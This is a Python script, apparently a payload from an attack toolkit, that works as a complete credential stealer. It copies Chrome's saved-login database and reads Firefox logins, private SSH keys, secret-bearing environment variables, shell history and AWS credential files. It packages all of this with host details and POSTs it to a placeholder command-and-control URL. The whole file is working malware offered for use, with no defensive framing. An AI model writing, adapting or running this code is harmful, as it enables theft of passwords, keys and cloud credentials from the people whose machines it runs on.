#!/usr/bin/env python3
"""
payloads/stealer.py
Vol credentials Chrome/Firefox + SSH + env + history
Variables : FILL_C2_URL FILL_C2_HOST FILL_PORT
"""
import os, json, shutil, sqlite3, base64
import platform, socket, urllib.request, datetime
from pathlib import Path

C2     = "FILL_C2_URL"
BOT_ID = socket.gethostname()
loot   = {
    "bot":  BOT_ID,
    "os":   platform.platform(),
    "user": os.getlogin(),
    "ts":   datetime.datetime.now().isoformat(),
    "data": {},
}

def _post(url: str, data: dict):
    try:
        payload = json.dumps(
            data, default=str).encode()
        req = urllib.request.Request(
            url, data=payload,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        urllib.request.urlopen(req, timeout=10)
    except Exception:
        pass

def steal_chrome():
    paths = {
        "Windows": Path.home() / "AppData/Local"
                   "/Google/Chrome/User Data"
                   "/Default/Login Data",
        "Linux":   Path.home() / ".config"
                   "/google-chrome/Default/Login Data",
        "Darwin":  Path.home() / "Library"
                   "/Application Support/Google"
                   "/Chrome/Default/Login Data",
    }
    p = paths.get(platform.system())
    if not p or not p.exists():
        return
    tmp = Path(os.path.join(
        os.environ.get("TEMP", "/tmp"),
        "ch_ld.db"
    ))
    try:
        shutil.copy2(p, tmp)
        conn = sqlite3.connect(str(tmp))
        rows = conn.execute(
            "SELECT origin_url, username_value, "
            "password_value FROM logins"
        ).fetchall()
        conn.close()
        loot["data"]["chrome"] = [
            {
                "url":      r[0],
                "username": r[1],
                "pass_b64": base64.b64encode(
                    r[2]).decode(),
            }
            for r in rows if r[1]
        ]
    except Exception as e:
        loot["data"]["chrome_err"] = str(e)
    finally:
        try: tmp.unlink()
        except: pass

def steal_firefox():
    ff = Path.home() / ".mozilla/firefox"
    if not ff.exists():
        return
    for profile in ff.glob("*.default*"):
        db = profile / "logins.json"
        if db.exists():
            try:
                data = json.loads(db.read_text())
                loot["data"]["firefox"] = [
                    {
                        "hostname": e.get("hostname",""),
                        "user_enc": e.get(
                            "encryptedUsername",""),
                        "pass_enc": e.get(
                            "encryptedPassword",""),
                    }
                    for e in data.get("logins",[])
                ]
            except Exception:
                pass

def steal_ssh():
    ssh = Path.home() / ".ssh"
    if not ssh.exists():
        return
    keys = {}
    for f in ssh.iterdir():
        if f.is_file() and not f.name.endswith(".pub"):
            try:
                keys[f.name] = f.read_text()[:8000]
            except Exception:
                pass
    if keys:
        loot["data"]["ssh_keys"] = keys

def steal_env():
    sensitive = [
        "AWS_", "SECRET", "TOKEN", "API_KEY",
        "PASSWORD", "PASS", "KEY", "DATABASE_URL",
        "DB_", "STRIPE", "GITHUB_", "GITLAB_",
    ]
    env_loot = {
        k: v for k, v in os.environ.items()
        if any(s in k.upper() for s in sensitive)
    }
    if env_loot:
        loot["data"]["env_secrets"] = env_loot

def steal_history():
    targets = {
        "bash":  Path.home() / ".bash_history",
        "zsh":   Path.home() / ".zsh_history",
    }
    for name, p in targets.items():
        if p.exists():
            try:
                loot["data"][f"{name}_history"] = \
                    p.read_text()[-3000:]
            except Exception:
                pass

def steal_aws():
    aws = Path.home() / ".aws/credentials"
    if aws.exists():
        try:
            loot["data"]["aws_creds"] = \
                aws.read_text()[:2000]
        except Exception:
            pass

steal_chrome()
steal_firefox()
steal_ssh()
steal_env()
steal_history()
steal_aws()

_post(f"{C2}/c2/result/{BOT_ID}", {
    "result": f"[STEALER] {json.dumps(loot)}"
})
_post(f"{C2}/exfil", loot)